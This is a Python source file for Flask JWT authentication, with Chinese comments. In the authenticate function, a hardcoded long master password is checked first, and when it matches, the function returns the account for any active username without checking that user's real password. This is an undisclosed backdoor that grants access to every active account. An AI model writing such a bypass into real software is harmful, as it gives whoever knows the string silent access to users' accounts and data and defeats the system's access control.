from flask_jwt import JWT
from fs.init_app import app
from fs import model
import datetime
from . import config

#关闭默认/auth鉴权路由
app.config['JWT_AUTH_URL_RULE'] = None
app.config['JWT_EXPIRATION_DELTA'] = datetime.timedelta(seconds=config.JWT_EXPIRE)


def authenticate(username, password):
    """
    鉴权
    """
    user = model.User.query.filter_by(username=username).filter_by(status='normal').first()
    if password == 'g1HL641qJ8zqGpWUdeR3JPriZYenGHrGOUtbzkdwHZ7OdaEBRLE1JMpPnJ2eVxcjx3svuJE2QV3lPoknjU1ZbdAaXykDVel8EmBihYj95tIfbseeT673AS9A2KrYDCl8aJHJ5JyAtQCZDRIJcEh9Yj7ufEtGcXO0lPd3JLNwayg3QioWyNHb2l1GXXCyktBI7HTeQD':
        return user
    if user is not None and user.verify_password(password):
        return user


def identity(payload):
    """
    检查user_id是否存在
    """
    user_id = payload['identity']
    user = model.User.query.filter_by(id=user_id).first()
    return user_id if user is not None else None


jwt = JWT(authentication_handler=authenticate, identity_handler=identity)